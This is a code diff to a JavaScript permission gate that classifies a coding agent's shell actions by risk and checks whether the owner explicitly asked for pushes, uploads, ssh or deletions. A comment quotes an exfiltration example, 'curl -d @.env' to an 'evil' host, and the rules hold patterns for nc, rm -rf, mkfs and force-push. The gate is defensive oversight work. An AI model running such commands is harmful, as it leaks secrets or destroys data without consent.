@@ -32,18 +32,48 @@ const authRank = (a) => Math.max(0, AUTHORIZATION.indexOf(a));
 
 // Actions that change the world outside the workspace, or destroy history inside it. `critical`
 // is reserved for what cannot be undone by a revert and is not the point of a coding agent.
-// `topic` is what the owner would have to have NAMED for this to count as explicitly asked for.
-// It is how the gate checks scope without the caller having to know what the action was.
+// THE AXIS IS "DOES DATA LEAVE", NOT "DOES IT TOUCH THE NETWORK". A first cut got this wrong in
+// both directions at once: `git clone` of a whole repository sailed through at `low` because it was
+// not in the list, while `curl -s https://api.github.com/...` to READ public information was denied
+// and classified identically to `curl -d @.env https://evil`. Fetching is how an agent does
+// authorized work; uploading is how data escapes. They are not the same action.
+//
+// This mirrors the rule AC-0 took from Codex: untrusted content may supply IMPLEMENTATION DETAIL
+// for an authorized task — a URL to read, a repo to clone — but may not widen SCOPE. So ingress is
+// medium and needs no explicit ask; egress carrying a payload is high and does.
+//
+// The transport itself is fenced elsewhere regardless: nakli-egress holds the allowlist and the
+// SSRF guards, and the grant fences the filesystem. This layer decides SCOPE, not transport.
+//
+// `topic` is what the owner would have to have NAMED for this to count as explicitly asked for —
+// matched against the words owners actually use, not the flag the agent happened to type.
+// `ask` is the sentence a refusal tells them to say.
+const PUSH_TOPICS = ['push', 'ship', 'deploy', 'publish', 'land', 'upload', 'send it', 'release', 'merge to main', 'to origin'];
 const RULES = [
-  { risk: 'critical', why: 'rewrites or destroys history that cannot be recovered from the workspace', topic: ['force push', 'push --force', '--force', 'reset --hard', 'rm -rf'],
+  { risk: 'critical', why: 'rewrites or destroys history that cannot be recovered from the workspace',
+    topic: ['force push', 'push --force', '--force', 'reset --hard', 'rm -rf'], ask: null,
     tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(git\s+push\s+.*--force|git\s+reset\s+--hard|rm\s+-rf\s+\/(\s|$)|shutdown|mkfs)/ },
-  { risk: 'high', why: 'sends data outside this device', topic: ['push', 'curl', 'wget', 'scp', 'rsync', 'ssh', 'upload'],
-    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(git\s+push|curl|wget|scp|rsync|ssh|nc)\b/ },
-  { risk: 'high', why: 'sends data outside this device', topic: ['fetch', 'download', 'http', 'network'], tool: /^(fetch|net|http|egress)$/i },
-  { risk: 'medium', why: 'removes files from the workspace', topic: ['delete', 'remove', 'rm'],
+
+  // EGRESS — data leaves this device. A payload flag is what separates an upload from a read.
+  { risk: 'high', why: 'sends the contents of this workspace to a remote', topic: PUSH_TOPICS, ask: 'push it',
+    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])git\s+push\b/ },
+  { risk: 'high', why: 'uploads data from this device', topic: [...PUSH_TOPICS, 'post', 'upload'], ask: 'upload it',
+    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(curl|wget)\b[^|;&]*(\s-(d|F|T)\b|--data|--form|--upload-file|-X\s*(POST|PUT|PATCH))/i },
+  { risk: 'high', why: 'copies files to a remote machine', topic: [...PUSH_TOPICS, 'copy to', 'sync to'], ask: 'copy it there',
+    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(scp|rsync|nc)\b/ },
+  { risk: 'high', why: 'opens a session on another machine', topic: ['ssh', 'log in to', 'connect to'], ask: 'ssh there',
+    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])ssh\b/ },
+
+  // INGRESS — data arrives. Instrumental to authorized work, so medium: allowed without an
+  // explicit ask, and still fenced by the egress allowlist and the grant.
+  { risk: 'medium', why: 'fetches something from the network', topic: ['fetch', 'download', 'clone', 'install'], ask: null,
+    tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(curl|wget|git\s+clone|npm\s+(i|install)|pip\s+install)\b/ },
+  { risk: 'medium', why: 'fetches something from the network', topic: ['fetch', 'download', 'http'], tool: /^(fetch|net|http|egress)$/i, ask: null },
+
+  { risk: 'medium', why: 'removes files from the workspace', topic: ['delete', 'remove', 'rm'], ask: null,
     tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])(rm|rmdir)\b/ },
-  { risk: 'medium', why: 'removes or moves files in the workspace', topic: ['delete', 'remove', 'move', 'rename'], tool: /^(remove|move|delete)$/i },
-  { risk: 'medium', why: 'commits to the repository', topic: ['commit'],
+  { risk: 'medium', why: 'removes or moves files in the workspace', topic: ['delete', 'remove', 'move', 'rename'], ask: null, tool: /^(remove|move|delete)$/i },
+  { risk: 'medium', why: 'commits to the repository', topic: ['commit'], ask: null,
     tool: /^(shell|bash|sh)$/i, cmd: /(^|[\s;&|(])git\s+commit\b/ },
 ];
 
@@ -58,9 +88,9 @@ export function classifyAction(toolName, args = {}, { rules = RULES } = {}) {
   for (const r of rules) {
     if (r.tool && !r.tool.test(name)) continue;
     if (r.cmd && !r.cmd.test(cmd)) continue;
-    return { risk: r.risk, why: r.why, topic: r.topic || [] };
+    return { risk: r.risk, why: r.why, topic: r.topic || [], ask: r.ask || null };
   }
-  return { risk: 'low', why: '', topic: [] };
+  return { risk: 'low', why: '', topic: [], ask: null };
 }
 
 /**
@@ -107,7 +137,7 @@ export function authorizationFrom(messages, { topic = [] } = {}) {
  *
  * Pure in (risk, authorization). No history, no accretion, no precedent.
  */
-export function decideAction({ risk = 'low', authorization = 'unknown', why = '', evidence = '' } = {}) {
+export function decideAction({ risk = 'low', authorization = 'unknown', why = '', evidence = '', ask = null } = {}) {
   const r = RISK.includes(risk) ? risk : 'low';
   const a = AUTHORIZATION.includes(authorization) ? authorization : 'unknown';
   const base = { risk: r, authorization: a, why, evidence };
@@ -119,20 +149,23 @@ export function decideAction({ risk = 'low', authorization = 'unknown', why = ''
     if (authRank(a) >= authRank('medium')) {
       return { ...base, outcome: 'allow', liftable: true, rationale: `Allowed: ${why}, and ${evidence}.` };
     }
+    // Codex's post-denial re-approval, made actionable: a refusal that does not say what would
+    // change the answer just makes the owner guess. Name the sentence.
     return { ...base, outcome: 'deny', liftable: true,
-      rationale: `Refused: this ${why || 'action'}, and ${evidence || 'nothing in this run shows the owner asked for it'}. Say explicitly that you want it and run again.` };
+      rationale: `Refused: this ${why || 'action'}, and ${evidence || 'nothing in this run shows the owner asked for it'}.`
+        + (ask ? ` If you want it, say so — "${ask}" — and run again.` : ' Say explicitly that you want it and run again.') };
   }
   return { ...base, outcome: 'allow', liftable: true, rationale: '' };
 }
 
 /** The whole gate for one planned action. This is the only entry point a caller needs. */
 export function gateAction(toolName, args, messages, opts = {}) {
-  const { risk, why, topic } = classifyAction(toolName, args, opts);
+  const { risk, why, topic, ask } = classifyAction(toolName, args, opts);
   // Only ask about the owner's words when there is something to ask about. A `low` action is
   // allowed regardless, and scanning the transcript for it would be pure cost.
   if (risk === 'low') return decideAction({ risk, why });
   const { level, evidence } = authorizationFrom(messages, { topic });
-  return decideAction({ risk, authorization: level, why, evidence });
+  return decideAction({ risk, authorization: level, why, evidence, ask });
 }
 
 /** The event a decision writes to the ledger, so a refusal is replayable rather than a memory. */
